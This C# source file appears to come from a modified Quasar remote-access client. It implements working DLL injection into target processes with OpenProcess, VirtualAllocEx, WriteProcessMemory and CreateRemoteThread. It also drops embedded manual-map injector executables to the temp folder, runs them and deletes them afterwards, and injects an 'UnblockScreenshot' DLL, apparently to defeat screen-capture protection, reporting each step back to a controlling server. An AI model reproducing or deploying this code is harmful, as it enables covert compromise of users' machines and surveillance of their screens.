using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;
using Quasar.Client.Utilities;
using Quasar.Common.Messages;

using Quasar.Common.Networking;

namespace Quasar.Client.Helper
{
    public static class DllInjectionHelper
    {
        public static void Inject(string processName, string dllPath, ISender client)
        {
            foreach (Process process in Process.GetProcessesByName(processName))
            {
                IntPtr hProcess = NativeMethods.OpenProcess(1082, false, process.Id);
                if (hProcess == IntPtr.Zero)
                {
                    //MessageBox.Show("failed to open process");
                    client.Send(new NotifyMessageToServer { Message = $"Failed to open process {processName} (ID: {process.Id}). Error: {Marshal.GetLastWin32Error()}" });
                    continue;
                }
                IntPtr procAddress = NativeMethods.GetProcAddress(NativeMethods.GetModuleHandle("kernel32.dll"), "LoadLibraryA");
                if (procAddress == IntPtr.Zero)
                {
                    //MessageBox.Show("failed to get loadlibrarya address");
                    client.Send(new NotifyMessageToServer { Message = "Failed to get LoadLibraryA address. Error: " + Marshal.GetLastWin32Error() });
                    NativeMethods.CloseHandle(hProcess);
                    continue;
                }
                IntPtr intPtr = NativeMethods.VirtualAllocEx(hProcess, IntPtr.Zero, (uint)((dllPath.Length + 1) * Marshal.SizeOf(typeof(char))), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
                if (intPtr == IntPtr.Zero)
                {
                    //MessageBox.Show("Failed to allocate memory in target process.");
                    client.Send(new NotifyMessageToServer { Message = "Failed to allocate memory in target process. Error: " + Marshal.GetLastWin32Error() });
                    NativeMethods.CloseHandle(hProcess);
                    continue;
                }
                byte[] array = Encoding.ASCII.GetBytes(dllPath + "\0");
                UIntPtr uintPtr;
                if (!NativeMethods.WriteProcessMemory(hProcess, intPtr, array, (uint)array.Length, out uintPtr))
                {
                    //MessageBox.Show("Failed to write to process memory.");
                    client.Send(new NotifyMessageToServer { Message = "Failed to write to process memory. Error: " + Marshal.GetLastWin32Error() });
                    NativeMethods.VirtualFreeEx(hProcess, intPtr, 0, 0x8000); // MEM_RELEASE
                    NativeMethods.CloseHandle(hProcess);
                    continue;
                }

                IntPtr remoteThread = NativeMethods.CreateRemoteThread(hProcess, IntPtr.Zero, 0U, procAddress, intPtr, 0U, IntPtr.Zero);
                if (remoteThread == IntPtr.Zero)
                {
                    //MessageBox.Show("Failed to create remote thread.");
                    client.Send(new NotifyMessageToServer { Message = "Failed to create remote thread. Error: " + Marshal.GetLastWin32Error() });
                    NativeMethods.VirtualFreeEx(hProcess, intPtr, 0, 0x8000); // MEM_RELEASE
                }

                NativeMethods.CloseHandle(hProcess);
                client.Send(new NotifyMessageToServer { Message = "injection is ended" });
                //MessageBox.Show("injection end");
            }
        }

        public static string[] InjectManualMap(string processName, string dllPath, bool isWow64)
        {
            List<string> list = new List<string>();
            string text = Path.Combine(new string[]
            {
                Path.GetTempPath(),
                Guid.NewGuid().ToString() + ".exe"
            });
            Process[] processesByName = Process.GetProcessesByName(processName);
            try
            {
                if (isWow64)
                    File.WriteAllBytes(text, Resource1.ManualMapInjector_x86);
                else
                    File.WriteAllBytes(text, Resource1.ManualMapInjector_x64);
            }
            catch (Exception)
            {
            }
            foreach (Process process in processesByName)
            {
                string str;
                string str2;
                Misc.CheckOutput("\"" + text + "\"", string.Format("\"{0}\" {1}", dllPath, process.Id), out str, out str2);
                list.Add(str + "\n" + str2);
            }
            try
            {
                File.Delete(text);
            }
            catch (Exception)
            {
            }
            return list.ToArray();
        }

        private static string InjectManualMapByProcessId(int processId, string dllPath, bool isWow64)
        {
            if (processId == 0 || dllPath == "")
            {
                return "invalid process id or dll path";
            }
            string injectorPath = Path.Combine(new string[]
            {
                Path.GetTempPath(),
                Guid.NewGuid().ToString() + ".exe"
            });
            try
            {
                if (isWow64)
                    File.WriteAllBytes(injectorPath, Resource1.ManualMapInjector_x86);
                else
                    File.WriteAllBytes(injectorPath, Resource1.ManualMapInjector_x64);
            }
            catch (Exception)
            {
            }
            string str;
            string str2;
            Misc.CheckOutput("\"" + injectorPath + "\"", string.Format("\"{0}\" {1}", dllPath, processId), out str, out str2);

            try
            {
                File.Delete(injectorPath);
            }
            catch (Exception)
            {
            }
            return str + "\n" + str2;
        }

        static bool IsFileInUse(string filePath)
        {
            try
            {
                using (FileStream stream = new FileStream(filePath, FileMode.Open, FileAccess.Read, FileShare.None))
                {
                    // If we can open the file, it is not in use
                    return false;
                }
            }
            catch (IOException)
            {
                // If an IOException is thrown, the file is in use
                return true;
            }
        }

        public static bool InjectNormalUnblockDll(string processName, string dllName, ISender client, out string resultStr)
        {
            resultStr = "";
            Process[] processes = Process.GetProcessesByName(processName);
            bool isSucess = true;

            bool isWow64 = true;
            string dllPath = "";
            if (processes.Length == 0)
                return false;
            foreach (Process process in processes)
            {
                IntPtr hProcess = process.Handle;
                if (!NativeMethods.IsWow64Process(hProcess, out isWow64))
                {
                    client.Send(new NotifyMessageToServer { Message = "Quering process bitness failed" });
                }
            }
            if (isWow64)
            {
                byte[] realUnblockScreenshotx86 = Resource1.UnblockScreenshot_x86;
                dllPath = Path.Combine(new string[]
                {
                        Path.GetTempPath(),
                        dllName + "_x86.dll"
                });
                try
                {
                    File.WriteAllBytes(dllPath, realUnblockScreenshotx86);
                }
                catch (Exception ex5)
                {
                    isSucess = false;
                    client.Send(new NotifyMessageToServer { Message = string.Format("{0}:{1}\n\n{2}", Misc.__FILE__("MiscHandler1.cs"), Misc.__LINE__(244), ex5.Message) });
                }
            }
            else
            {
                byte[] realUnblockScreenshotx64 = Resource1.UnblockScreenshot_x64;
                dllPath = Path.Combine(new string[]
                {
                        Path.GetTempPath(),
                        dllName + "_x64.dll"
                });
                try
                {
                    File.WriteAllBytes(dllPath, realUnblockScreenshotx64);
                }
                catch (Exception ex5)
                {
                    isSucess = false;
                    client.Send(new NotifyMessageToServer { Message = string.Format("{0}:{1}\n\n{2}", Misc.__FILE__("MiscHandler2.cs"), Misc.__LINE__(244), ex5.Message) });
                }
            }
            foreach(Process process in processes)
            {
                try
                {
                    resultStr = InjectManualMapByProcessId(process.Id, dllPath, isWow64);
                }
                catch (Exception ex6)
                {
                    isSucess = false;
                    client.Send(new NotifyMessageToServer { Message = string.Format("{0}:{1}\n\n{2}", Misc.__FILE__("MiscHandler3.cs"), Misc.__LINE__(253), ex6.Message) });
                }
            }

            return isSucess;
        }

        private const int PROCESS_CREATE_THREAD = 2;

        private const int PROCESS_QUERY_INFORMATION = 1024;

        private const int PROCESS_VM_OPERATION = 8;

        private const int PROCESS_VM_WRITE = 32;

        private const int PROCESS_VM_READ = 16;

        private const uint MEM_COMMIT = 0x01000;

        private const uint MEM_RESERVE = 0x02000;

        private const uint PAGE_READWRITE = 0x04;
    }
}
